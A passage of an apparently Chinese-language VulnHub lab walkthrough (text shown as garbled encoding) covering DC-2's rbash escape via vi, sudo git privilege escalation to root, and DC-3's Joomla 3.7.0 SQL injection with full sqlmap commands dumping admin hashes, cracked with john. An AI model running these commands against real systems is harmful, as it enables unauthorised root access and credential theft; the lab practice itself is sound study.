<p>å…³é”®æ˜¯<code>vi</code>çš„å‘½ä»¤</p>
<h3><span id="viç»•è¿‡-gtrbashé€ƒé€¸">*viç»•è¿‡-&gt;rbashé€ƒé€¸</span></h3><p>å¯ä»¥è¿›å…¥<code>vi</code>ä¸­ï¼Œæ‰§è¡Œ<code>set</code>å‘½ä»¤ï¼ŒæŠŠ<code>shell</code>æ”¹ä¸º<code>/bin/sh</code></p>
<blockquote>
<p> å…ˆè¾“å…¥<code>vi</code>ï¼Œè¿›å…¥<code>vi</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831233127692.png" alt="image-20220831233127692"></p>
<p>ç„¶å</p>
<blockquote>
<p>ç›´æ¥è¾“å…¥ï¼Œ<strong>ä¸ç”¨æŒ‰i</strong><br><code>:set shell=/bin/sh</code>    &#x2F;&#x2F;ç»™shellèµ‹å€¼<br>å›è½¦<br><code>:shell</code>                &#x2F;&#x2F;æ‰§è¡Œshell<br>å›è½¦ï¼Œå°±é€€å›ä¸»ç•Œé¢æ¥äº†</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831233626801.png" alt="image-20220831233626801"></p>
<p>è¿™æ ·æˆ‘ä»¬å°±å®Œæˆäº†é€ƒé€¸</p>
<p>ä¹‹å‰å› ä¸ºæˆ‘ä»¬å—é™äº<code>rbash</code>ï¼Œä¸èƒ½æ‰§è¡Œ<code>cd</code>ç­‰å‘½ä»¤</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831233814113.png" alt="image-20220831233814113"></p>
<p>ç°åœ¨æ‰§è¡Œè¯•è¯•</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831234028674.png" alt="image-20220831234028674"></p>
<p>å°±æ²¡æœ‰é˜»æ­¢äº†</p>
<p>æˆ‘ä»¬å†è¯•è¯•<code>cat</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831234235801.png" alt="image-20220831234235801"></p>
<p>å‘ç°<code>cat</code>å‘½ä»¤æ‰¾ä¸åˆ°ï¼Œä½†æ˜¯æˆ‘ä»¬å·²ç»ç»•è¿‡äº†<code>rbash</code>ï¼Œæ‰€ä»¥åªèƒ½æ˜¯å…¶ä»–åŸå› ï¼Œæœ€æœ‰å¯èƒ½å°±æ˜¯<code>cat</code>çš„ç¯å¢ƒæ²¡æœ‰è®¾ç½®åˆ°å½“å‰ä½ç½®</p>
<blockquote>
<p>è¾“å…¥<code>echo $PATH</code><br>è¿™æ˜¯æ˜¾ç¤ºå½“å‰ç¯å¢ƒå˜é‡ï¼Œå¯èƒ½catå¹¶æ²¡æœ‰è¢«è®¾ç½®åˆ°å½“å‰çš„ç¯å¢ƒå˜é‡æ‰€ä»¥æ— æ³•æ‰§è¡Œ</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831234423827.png" alt="image-20220831234423827"></p>
<h3><span id="è®¾ç½®å…¨å±€å˜é‡">*è®¾ç½®å…¨å±€å˜é‡</span></h3><blockquote>
<p>äºæ˜¯æˆ‘ä»¬æ¥è®¾ç½®å…¨å±€å˜é‡,ç»ˆç«¯è¾“å…¥<br><code>export PATH=PATH:/usr/local/sbin:/usr/local/bin:usr/sbin:/usr/bin:/bin:sbin</code></p>
</blockquote>
<p>è¿™æ ·æˆ‘ä»¬æ‰§è¡Œ<code>cat</code>å°±ä¸ä¼šåªåœ¨<code>/home/tom/usr/bin</code>é‡Œé¢å¯»æ‰¾äº†ï¼Œä¼šåœ¨å¾ˆå¤šç›®å½•é‡Œå¯»æ‰¾</p>
<blockquote>
<p>è¾“å…¥</p>
<p><code>cd tom</code><br><code>ls</code><br><code>cat flag3.txt</code><br>å¾—åˆ°flag3</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220831235038373.png" alt="image-20220831235038373"></p>
<blockquote>
<p><code>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</code><br>æ„æ€æ˜¯ï¼š</p>
<p>å¯æ€œçš„è€æ±¤å§†æ€»æ˜¯åœ¨è¿½æ°ç‘ã€‚ä¹Ÿè®¸ä»–åº”è¯¥ä¸ºä»–é€ æˆçš„æ‰€æœ‰å‹åŠ›è´Ÿè´£ã€‚</p>
<p>ä½†æ˜¯çœ‹åˆ°äº†suï¼Œä¹Ÿå°±æ˜¯éœ€è¦åˆ‡æ¢ç”¨æˆ·</p>
</blockquote>
<hr>
<h2><span id="flag4">Flag4</span></h2><p>æ ¹æ®<code>flag3</code>ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“éœ€è¦ç”¨<code>su</code>å‘½ä»¤åˆ‡æ¢ç”¨æˆ·åˆ°<code>jerry</code></p>
<blockquote>
<p>è¾“å…¥<code>su jerry</code>å’Œå…¶å¯†ç <code>adipiscing</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220901094337288.png" alt="image-20220901094337288"></p>
<p>ç„¶ååˆ‡æ¢åˆ°<code>jerry</code>ç›®å½•ï¼Œå‘ç°<code>flag4.txt</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220901094512382.png" alt="image-20220901094512382"></p>
<blockquote>
<p><code>Good to see that you&#39;ve made it this far - but you&#39;re not home yet.</code> </p>
<p><code>You still need to get the final flag (the only flag that really counts!!!).</code>  </p>
<p><code>No hints here - you&#39;re on your own now.  :-)</code></p>
<p><code>Go on - git outta here!!!!</code><br>æ„æ€æ˜¯ï¼š<br>å¾ˆé«˜å…´çœ‹åˆ°ä½ èµ°äº†è¿™ä¹ˆè¿œï¼Œä½†ä½ è¿˜æ²¡å›å®¶ã€‚<br>ä½ ä»ç„¶éœ€è¦å¾—åˆ°æœ€åçš„æ ‡å¿—ï¼ˆå”¯ä¸€çœŸæ­£é‡è¦çš„æ ‡å¿—ï¼ï¼ï¼ï¼‰ã€‚<br>è¿™é‡Œæ²¡æœ‰æç¤º-ä½ ç°åœ¨åªèƒ½é è‡ªå·±äº†ã€‚ï¼š-ï¼‰</p>
<p>å»å§-æ»šå‡ºå»ï¼ï¼ï¼ï¼</p>
<p>çœ‹åˆ°gitï¼Œå°±æ˜¯æç¤ºæˆ‘ä»¬ç”¨gitå‘½ä»¤</p>
</blockquote>
<hr>
<h2><span id="flag5">Flag5</span></h2><h3><span id="gitç¼“å­˜åŒºæº¢å‡ºæ¼æ´">*gitç¼“å­˜åŒºæº¢å‡ºæ¼æ´</span></h3><blockquote>
<p>è¾“å…¥<code>sudo -l</code><br>&#x2F;&#x2F;åˆ—å‡ºç›®å‰ç”¨æˆ·å¯æ‰§è¡Œä¸æ— æ³•æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220901112624228.png" alt="image-20220901112624228"></p>
<p><u>å°±å¯ä»¥å‘ç°rootä»¥<code>nopasswd</code>ã€ä¸éœ€è¦å¯†ç ã€‘è¿è¡Œ<code>git</code>å‘½ä»¤</u></p>
<p>åŸç†æ˜¯<code>git</code>å­˜åœ¨ç¼“å­˜åŒºæº¢å‡ºæ¼æ´ï¼Œ</p>
<p>åœ¨ä½¿ç”¨</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure>

<p>ä¸éœ€è¦è¾“å…¥<code>root</code>å¯†ç ï¼Œå³å¯ä»¥<code>root</code>èº«ä»½æ‰§è¡Œè¿™æ¡å‘½ä»¤</p>
<p>æ“ä½œå¦‚ä¸‹</p>
<blockquote>
<p><code>sudo git -p</code>    </p>
<p>&#x2F;&#x2F;-pæ˜¯åˆ†é¡µæŸ¥çœ‹ï¼Œè¿™ä¸ªåŸç†å°±æ˜¯ç»ˆç«¯çš„çª—å£å¤§å°ä¸å¤Ÿæ˜¾ç¤ºï¼Œæ‰€ä»¥ä¸‹æ–¹ä¼šå‡ºç°å†’å·ï¼Œç­‰å¾…è¾“å…¥å‘½ä»¤</p>
</blockquote>
<p>ä¸‹é¢å¯ä»¥çœ‹çœ‹åŒºåˆ«</p>
<h4><span id="æ³¨æ„çª—å£å¤§å°">*æ³¨æ„çª—å£å¤§å°</span></h4><h5><span id="1çª—å£è¶³å¤Ÿå¤§">1.çª—å£è¶³å¤Ÿå¤§</span></h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220901113721300.png" alt="image-20220901113721300"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¾ç¤ºå®Œäº†ï¼Œå°±åˆå›åˆ°åŸå¤„äº†ã€ä¸è¡Œã€‘</p>
<h5><span id="2çª—å£å°ä¸€äº›">2.çª—å£å°ä¸€äº›</span></h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220901113851826.png" alt="image-20220901113851826"></p>
<p>ä¸‹æ–¹å°±æ˜¾ç¤ºå‡º:ï¼Œç­‰å¾…è¾“å…¥</p>
<blockquote>
<p>å†’å·<code>:</code>æ˜¯è‡ªå¸¦æœ‰çš„ï¼Œä¸æ˜¯è¾“å…¥çš„<br><code>:!/bin/sh</code></p>
<p>&#x2F;&#x2F;æ„Ÿå¹å·!æ˜¯shellè½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥è¦é¿å…sudoæˆæƒç”¨æˆ·ä½¿ç”¨<code>viï¼Œvimï¼Œftpï¼Œleeï¼Œmoreï¼Œgit</code><br><code>è¿›å…¥root</code></p>
<p><code>cd /root</code></p>
<p>å½“ç„¶ä¹Ÿå¯ä»¥æ‰§è¡Œ<code>:!passwd root</code><br>ä¿®æ”¹å…¶å¯†ç <br>ç„¶å<code>su root</code>ç™»å½•ä¹Ÿå¯</p>
</blockquote>
<h3><span id="æ³•-1æ‰§è¡Œå‘½ä»¤æ‹¿åˆ°rootçš„shell">æ³• 1.æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell</span></h3><p><code>$</code>å˜æˆ<code>#</code>æˆåŠŸ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220901114902493.png" alt="image-20220901114902493"></p>
<h3><span id="æ³•-2ä¿®æ”¹å¯†ç ç™»å½•">æ³• 2.ä¿®æ”¹å¯†ç ï¼Œç™»å½•</span></h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220901114453769.png" alt="image-20220901114453769"></p>
<p><code>$</code>å˜æˆ<code>#</code>ï¼ŒæˆåŠŸç™»å½•</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220901114726423.png" alt="image-20220901114726423"></p>
<p>ç„¶ååˆ°<code>/root</code>ç›®å½•ä¸‹ï¼Œæ‰¾åˆ°æœ€åçš„ <code>flag</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220901115306177.png" alt="image-20220901115306177"></p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___|<span class="string"> </span>|<span class="string"> </span>|<span class="string">   __</span>|<span class="string"> </span>|<span class="string"> ___  _ __   ___  / \</span></span><br><span class="line"><span class="string">\ \/  \/ / _ \ </span>|<span class="string"> </span>|<span class="string">  / _` </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">  \__,_</span>|<span class="string">\___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\___\/   </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>Congratulatons!!!</code></p>
<p><code>A special thanks to all those who sent me tweets</code><br><code>and provided me with feedback - it&#39;s all greatly</code><br><code>appreciated.</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code><br>æ„æ€æ˜¯ï¼š</p>
<p>æ­å–œï¼ï¼ï¼</p>
<p>ç‰¹åˆ«æ„Ÿè°¢æ‰€æœ‰ç»™æˆ‘å‘æ¨æ–‡çš„äºº</p>
<p>å¹¶å‘æˆ‘æä¾›äº†åé¦ˆ-éå¸¸æ£’<br>è°¢è°¢ã€‚</p>
<p>å¦‚æœæ‚¨å–œæ¬¢è¿™ä¸ªCTFï¼Œè¯·é€šè¿‡@DCAU7ç»™æˆ‘å‘ä¸€æ¡æ¨æ–‡</p>
</blockquote>
<p><strong>5ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
<hr>
<h1><span id="ä¸‰-dc-3åˆçº§">ä¸‰ã€DC-3[åˆçº§]</span></h1><p><strong>only one flag</strong></p>
<h2><span id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</span></h2><p>ã€å‰é¢çš„é¶æœº<code>ip</code>å¯»æ‰¾ï¼ŒæŒ‰ä¹‹å‰çš„æ­¥éª¤å³å¯ã€‘</p>
<p>å…ˆç”¨<code>nmap</code>æ‰«ä¸€ä¸‹æˆ‘ä»¬çš„é¶æœº<code>ip</code></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p- <span class="number">192.168.133.139</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220902123406584.png" alt="image-20220902123406584"></p>
<p>çœ‹åˆ°åªæœ‰<code>80</code>ç«¯å£ï¼Œè¿è¡Œç€ä¸€ä¸ª<code>http</code>æœåŠ¡ï¼Œä¸­é—´ä»¶ä¸º<code>apache2.4.18</code></p>
<p>å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆ<code>CMS</code>ï¼‰æ˜¯<code>joomla</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220902123056590.png" alt="image-20220902123056590"></p>
<p>åˆ©ç”¨æ’ä»¶<code>wappalyzer</code>ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°å…¶<code>CMS</code>ä¸º<code>joomla</code></p>
<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>kali</code>åŒ…å½“ä¸­è‡ªå¸¦çš„<code>joomscan</code>å·¥å…·å¯¹å…¶è¿›è¡Œæ‰«æ</p>
<blockquote>
<p>æ¼æ´æ‰«æå™¨ï¼ˆJoomScanï¼‰æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œå…¶ä¸»è¦ç›®çš„æ˜¯å®ç°æ¼æ´æ£€æµ‹çš„è‡ªåŠ¨åŒ–ï¼Œä»¥å¢å¼ºJoomla CMSå¼€å‘çš„å®‰å…¨æ€§ã€‚è¯¥å·¥å…·åŸºäºPerlå¼€å‘ï¼Œèƒ½å¤Ÿè½»æ¾æ— ç¼åœ°å¯¹å„ç§Joomlaé¡¹ç›®è¿›è¡Œæ¼æ´æ‰«æï¼Œå…¶è½»é‡åŒ–å’Œæ¨¡å—åŒ–çš„æ¶æ„èƒ½å¤Ÿä¿è¯æ‰«æè¿‡ç¨‹ä¸­ä¸ä¼šç•™ä¸‹è¿‡å¤šçš„ç—•è¿¹ã€‚å®ƒä¸ä»…èƒ½å¤Ÿæ£€æµ‹å·²çŸ¥æ¼æ´ï¼Œè€Œä¸”è¿˜èƒ½å¤Ÿæ£€æµ‹åˆ°å¾ˆå¤šé”™è¯¯é…ç½®æ¼æ´å’Œç®¡ç†æƒé™æ¼æ´ç­‰ç­‰ã€‚è¿˜èƒ½å¤Ÿä»¥HTMLæˆ–æ–‡æœ¬æ ¼å¼å¯¼å‡ºæ‰«ææŠ¥å‘Šã€‚</p>
</blockquote>
<p>ã€æ²¡æœ‰çš„ï¼Œå¯èƒ½éœ€è¦æ›´æ–°åŒ…ï¼Œç„¶åç›´æ¥ä¸‹è½½å³å¯ã€‘</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220902185529785.png" alt="image-20220902185529785"></p>
<blockquote>
<p>è¾“å…¥<code>joomscan -u 192.168.133.139</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220902185954570.png" alt="image-20220902185954570"></p>
<p>æ‰«æå‘ç°äº†ï¼Œç®¡ç†å‘˜çš„ç™»å½•ç½‘å€<code>http://192.168.133.139/administrator/</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220902190312468.png" alt="image-20220902190312468"></p>
<p>ä½†æ˜¯ä¸çŸ¥é“ç”¨æˆ·åå’Œå¯†ç </p>
<hr>
<p>å‘ç°å…¶<code>joomla</code>ç‰ˆæœ¬ä¸º<code>3.7.0</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220902194849302.png" alt="image-20220902194849302"></p>
<p>ä½†æˆ‘ä»¬å¹¶ä¸çŸ¥é“è¯¥ç‰ˆæœ¬æœ‰å“ªäº›æ¼æ´ï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ° <code>kali</code>çš„<code>Exploit-DB</code>å·¥å…·</p>
<p>å¯ä»¥åœ¨æµè§ˆå™¨é‡Œçš„<code>Exploit-DB</code>ç½‘å€è¿›è¡ŒæŸ¥è¯¢ã€ä¸è¿‡å› ä¸ºæ˜¯å›½å¤–ç½‘å€æœ‰ç‚¹å¡ã€‘</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220902195723987.png" alt="image-20220902195723987"></p>
<p>ç„¶åå¯»æ‰¾ä¸‹è½½payload</p>
<hr>
<p>ä¹Ÿå¯ä»¥åœ¨ç»ˆç«¯è¾“å…¥å‘½ä»¤æŸ¥è¯¢ã€ä¹Ÿæ˜¯åŸºäº<code>Exploit-DB</code>çš„å‘½ä»¤è¡Œæœç´¢å·¥å…·,å¯ä»¥å¸®åŠ©æˆ‘ä»¬æŸ¥æ‰¾æ¸—é€æ¨¡å—ã€‘</p>
<blockquote>
<p>è¾“å…¥<code>searchsploit joomla 3.7.0</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903084826356.png" alt="image-20220903084826356"></p>
<p>å¯ä»¥çœ‹åˆ°<code>joomla 3.7.0</code>ç‰ˆæœ¬å­˜åœ¨<code>sqlæ³¨å…¥</code>çš„æ¼æ´</p>
<p> ç„¶åæŸ¥çœ‹<code>Path</code></p>
<blockquote>
<p>è¾“å…¥<code>searchsploit -p 42033</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903124805721.png" alt="image-20220903124805721"></p>
<p><code>Path</code>å°±æ˜¯è¯¥æ¼æ´åˆ©ç”¨æ–¹æ³•çš„æ–‡æœ¬åœ°å€</p>
<blockquote>
<p>è¾“å…¥<code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903125053542.png" alt="image-20220903125053542"></p>
<p>å¯ä»¥çœ‹åˆ°è¯¥æ¼æ´çš„æµ‹è¯•å¹³å°ï¼Œæ—¶é—´ï¼Œè¿˜æœ‰æ¼æ´çš„<code>CVE</code>ç¼–å·</p>
<p>å…³é”®åœ¨å®ƒç»™å‡ºçš„<code>sqlmap</code>æ³¨å…¥çš„æ¨¡æ¿</p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p>
<p>&#x2F;&#x2F;æŠŠlocalhostæ”¹æˆé¶æœºipå³å¯</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903125630036.png" alt="image-20220903125630036"></p>
<p>è¿è¡Œ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903125921853.png" alt="image-20220903125921853"></p>
<p>å‘ç°äº†é¶æœºä¸‹çš„æ•°æ®åº“ï¼Œæˆ‘ä»¬æ‰€éœ€è¦çš„å°±æ˜¯<code>joomladb</code></p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables</code></p>
<p>&#x2F;&#x2F;åœ¨åŸæœ‰çš„payloadååŠ ä¸Š-D joomladbï¼Œé€‰å®šæ•°æ®åº“<br>&#x2F;&#x2F;å†åœ¨åé¢åŠ ä¸Šâ€“tablesï¼Œè¾“å‡ºè¯¥æ•°æ®åº“çš„è¡¨</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903130545749.png" alt="image-20220903130545749"></p>
<p>ç„¶åå¯ä»¥çœ‹åˆ°<code>#__users</code>çš„è¡¨ï¼Œé‡Œé¢å¾ˆå¯èƒ½æœ‰çº¿ç´¢</p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; --columns</code></p>
<p>&#x2F;&#x2F;å’Œä¸Šä¸€æ­¥ç±»ä¼¼ï¼Œä½†æ³¨æ„è¡¨åæœ‰#ï¼Œæ‰€ä»¥éœ€è¦ç”¨å¼•å·æ¡†èµ·æ¥ï¼Œä¸ç„¶åé¢è¯­å¥å…¨è¢«æ³¨é‡Šäº†<br>&#x2F;&#x2F;*æ³¨ï¼Œsqlmapæç¤ºæŒ‰é»˜è®¤æ¨èå°±å¥½</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903131111592.png" alt="image-20220903131111592"></p>
<p>çœ‹åˆ°<code>username</code>å’Œ<code>password</code>ï¼ŒæŸ¥çœ‹åˆ—é‡Œå†…å®¹</p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; -C username,password --dump</code><br>&#x2F;&#x2F;dumpè·å–å­—æ®µä¸­çš„æ•°æ®</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903133516906.png" alt="image-20220903133516906"></p>
<p>å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç </p>
<p>ä½†æ˜¯å¯†ç è¢«åŠ å¯†äº†ï¼Œé‚£å°±åªèƒ½ç”¨ä¸€äº›å·¥å…·è¿›è¡Œè§£å¯†</p>
<p>å…ˆç”Ÿæˆä¸€ä¸ªåŠ å¯†å¯†ç çš„æ–‡æœ¬æ–‡ä»¶</p>
<blockquote>
<p>è¾“å…¥<code>vi passwd.txt</code><br>ç„¶åæŠŠåŠ å¯†æ•°æ®å¤åˆ¶è¿›å»<br><code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903134307088.png" alt="image-20220903134307088"></p>
<h2><span id="john">john</span></h2><p>ç„¶åæˆ‘ä»¬å°±éœ€è¦ç”¨ä¸€ä¸ªè§£å¯†å·¥å…·<code>john</code></p>
<p><code>John</code>æ˜¯ä¸€ä¸ªç ´è§£ç³»ç»Ÿå¯†ç çš„å·¥å…·</p>
<p>ä½¿ç”¨å¾ˆç®€å•</p>
<blockquote>
<p>è¾“å…¥<code>john passwd.txt</code></p>
<p>&#x2F;&#x2F;åé¢æ¥çš„æ˜¯å¯†ç æ–‡æœ¬æ–‡ä»¶</p>
</blockquote>
<p>ç„¶åè¾“å…¥</p>
<blockquote>
<p><code>john --show passwd.txt</code><br>&#x2F;&#x2F;æŸ¥çœ‹çˆ†ç ´æˆåŠŸçš„å¯†ç ï¼Œå‘ç°çˆ†ç ´æˆåŠŸ</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903140126704.png" alt="image-20220903140126704"></p>
<p>å¾—åˆ°å¯†ç <code>snoopy</code></p>
<p>ç„¶åç™»å½•åå°ç½‘å€</p>
<blockquote>
<p>ç”¨æˆ·åï¼š<code>admin</code><br>å¯†ç ï¼š<code>snoopy</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903140604935.png" alt="image-20220903140604935"></p>
<p>ç™»å½•æˆåŠŸï¼Œç„¶åæ‘¸ç´¢åˆ†æä¸€ä¸‹ç½‘ç«™</p>
<p>ç„¶ååœ¨<code>Extensions</code>â€“&gt;<code>Template</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903142609240.png" alt="image-20220903142609240"></p>
